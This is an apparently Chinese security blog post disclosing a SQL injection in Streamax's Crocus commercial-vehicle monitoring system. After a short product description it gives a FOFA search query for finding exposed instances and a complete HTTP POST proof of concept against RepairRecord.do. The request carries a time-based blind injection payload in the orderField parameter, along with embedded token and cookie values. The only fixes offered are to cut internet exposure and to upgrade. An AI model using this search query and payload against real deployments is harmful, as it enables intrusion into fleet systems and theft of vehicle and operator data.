#  锐明技术Crocus系统 RepairRecord.do SQL注入漏洞   
原创 lcyunkong  云途安全   2025-02-27 06:51  
  
0x00 阅读须知  
  
**本文所涉及的技术及相关工具仅供学习和研究用途，严禁将其用于任何非法活动。任何个人或组织因利用本文内容从事非法行为所引发的直接或间接后果及损失，均由行为人自行承担全部责任，作者及平台对此概不负责。本文所提供的工具来源于网络，其安全性请使用者自行评估。如涉及侵权，请联系删除。再次重申，本文内容仅限于合法学习与研究，任何非法使用行为均与作者及平台无关，相关责任由使用者自行承担。**  
  
### 0x01 产品简介  
###   
###         锐明技术作为一家专注于AI和视频技术的商用车智能物联（AIoT）解决方案提供商，Crocus系统是其核心产品之一。Crocus系统旨在利用人工智能、高清视频、大数据和自动驾驶技术，帮助商用车减少交通事故和货物丢失，提高企业或车队的运营效率。通过车载摄像头、毫米波雷达等传感器，实现对车辆周围环境的实时感知和监控，提高驾驶安全性。利用AI技术，系统能够识别车辆和行人的身份，并分析驾驶员的驾驶行为，及时提醒驾驶员注意潜在风险。Crocus系统能够实时监控货箱状态，包括货物是否丢失、货箱是否关闭等，并通过3D检测技术实现更精准的货物识别和管理。  
###   
### 0x02 漏洞详情  
  
****  
**fofa：**  
**app="/ThirdResource/respond/respond.min.js" && title="Crocus"**  
  
**Poc：**  
```
POST /RepairRecord.do?Action=QueryLast HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Token: c3RyZWFtYXgyMDAyMDgxODoxNzI0NjM2OTQyMTA0Ljg4NDU=
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: Saffron.U=VUlEPTEmVU49c3RyZWFtYXgyMDAyMDgxOCZHSUQ9MTcyNDYzNjk0MjEwNC44ODQ1MTQmUklEPTEmTT1CTWFwJklOUz0x
Connection: close
EndTime=2024-08-20+00%3A00%3A00&PageIndex=0&PageSize=20&RepairState=-1&StartTime=2024-08-26+00%3A00%3A00&orderField=(select*from(select%0asleep(5))a)&orderType=asc
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSYyicLs2ooaSnnwqCoANqWiakRNEnzW4NyJMDnibOtOVkBg9Bnwk9VuqbVOg9E2V9xhSTtibaBCMhr8Gw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSYyicLs2ooaSnnwqCoANqWiakaoLJHAzj4el8BvUFxXibZQRmtUxNspV0NVATukxIOnh4RYLChWAhnyQ/640?wx_fmt=png&from=appmsg "")  
  
**0x03 修复建议**  
  
****  
**关闭互联网暴露面或接口**  
  
**升级至安全版本**  
  
  
  
  
  
  
  
  
  
  
